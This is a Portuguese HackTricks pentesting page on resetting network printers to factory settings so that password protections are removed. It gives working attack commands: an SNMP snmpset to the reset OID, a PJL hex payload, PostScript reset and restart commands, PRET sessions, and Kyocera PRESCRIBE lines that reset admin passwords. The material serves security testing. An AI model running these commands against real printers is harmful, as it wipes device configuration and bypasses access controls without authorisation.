<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


**Resetar** um dispositivo para as configura√ß√µes de f√°brica √© uma funcionalidade cr√≠tica de seguran√ßa, pois **sobrescreve mecanismos de prote√ß√£o** como senhas definidas pelo usu√°rio. Isso geralmente pode ser feito pressionando uma **combina√ß√£o especial de teclas** no **painel de controle** da impressora. Realizar tal reset a frio leva apenas segundos e, portanto, √© um cen√°rio realista para atacantes locais ou pentesters, que podem, por exemplo, entrar sorrateiramente na sala de c√≥pias na hora do almo√ßo. No entanto, o **acesso f√≠sico** ao dispositivo **nem sempre √© uma op√ß√£o**.

### SNMP

O Printer-MIB define o Objeto **prtGeneralReset** (**OID 1.3.6.1.2.1.43.5.1.1.3.1**) que permite a um atacante reiniciar o dispositivo (powerCycleReset(4)), resetar as configura√ß√µes do NVRAM (resetToNVRAM(5)) ou restaurar as configura√ß√µes de f√°brica (resetToFactoryDefaults(6)) usando SNMP. Esse recurso/ataque √© **suportado por uma grande variedade de impressoras** e remove todos os mecanismos de prote√ß√£o como senhas definidas pelo usu√°rio para o servidor web embutido. Embora os mecanismos de prote√ß√£o possam ser eficientemente contornados, uma desvantagem pr√°tica dessa abordagem √© que toda a configura√ß√£o de **endere√ßo IP est√°tico ser√° perdida**. **Se n√£o houver** servi√ßo DHCP dispon√≠vel, o atacante **n√£o** ser√° capaz de **reconectar** ao dispositivo ap√≥s reset√°-lo para as configura√ß√µes de f√°brica.

**Resetar o dispositivo para as configura√ß√µes de f√°brica padr√£o** pode ser realizado usando o comando `snmpset` como mostrado abaixo (voc√™ precisa conhecer a **string da comunidade**, que na maioria dos casos √© `public` por padr√£o):
```bash
snmpset -v1 -c public printer 1.3.6.1.2.1.43.5.1.1.3.1 i 6
```
### [PML](./#pml)/[PJL](./#pjl)

Em muitos cen√°rios, um atacante n√£o tem a capacidade de realizar solicita√ß√µes SNMP devido a firewalls ou strings de comunidade SNMP desconhecidas. No entanto, em **dispositivos HP**, o **SNMP** pode ser transformado em sua **representa√ß√£o PML** e incorporar a solicita√ß√£o dentro de um trabalho de impress√£o leg√≠timo. Isso permite que um atacante **reinicie e/ou redefina o dispositivo** para as configura√ß√µes de f√°brica dentro de trabalhos de impress√£o comuns, conforme mostrado abaixo:
```bash
@PJL DMCMD ASCIIHEX="040006020501010301040106"
```
Qualquer pessoa pode reproduzir este ataque em impressoras HP, reiniciando ou redefinindo o dispositivo pode facilmente ser reproduzido usando [**PRET**](https://github.com/RUB-NDS/PRET):
```bash
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
### PostScript

PostScript oferece um recurso similar: O par√¢metro do sistema **FactoryDefaults**, 'uma flag que, se **definida como true** **imediatamente antes** da **impressora ser desligada**, faz com que todos os par√¢metros n√£o vol√°teis revertam para seus valores **padr√£o de f√°brica** na pr√≥xima vez que for ligada'. Deve-se notar que o pr√≥prio **PostScript** tamb√©m tem a capacidade de **reiniciar** seu **ambiente**, mas requer uma **senha v√°lida**. \
No entanto, o interpretador PostScript pode ser colocado em um **loop infinito**, conforme discutido em ataques de DoS de [processamento de documentos](http://hacking-printers.net/wiki/index.php/Document\_processing), o que obriga o usu√°rio a **reiniciar manualmente** o dispositivo e, assim, redefinir a senha do PostScript.

Redefinir os par√¢metros do sistema PostScript para os padr√µes de f√°brica:
```bash
<< /FactoryDefaults true >> setsystemparams
```
Reinicie o interpretador PostScript e a mem√≥ria virtual:
```bash
true 0 startjob systemdict /quit get exec
```
Qualquer pessoa pode reiniciar ou redefinir o interpretador PostScript de uma impressora, o que **pode ser facilmente reproduzido usando** [**PRET**](https://github.com/RUB-NDS/PRET):
```bash
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
### PRESCRIBE

Para **dispositivos Kyocera**, as linguagens de descri√ß√£o de p√°gina **PRESCRIBE** podem ser usadas para **redefinir o dispositivo** para as configura√ß√µes de f√°brica a partir de trabalhos de impress√£o comuns usando um dos comandos mostrados abaixo:
```bash
!R! KSUS "AUIO", "CUSTOM:Admin Password = 'admin00'";  CMMT "Drop the security level, reset password";
!R! ACNT "REST";                                       CMMT "Reset account code admin password";
!R! EGRE;                                              CMMT "Reset the engine board to factory defaults";
!R! SIOP0,"RESET:0";                                   CMMT "Reset configuration settings";
```
Para reproduzir este ataque, abra uma conex√£o de rede crua com a porta 9100/tcp da impressora e **envie os comandos documentados acima**.


<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
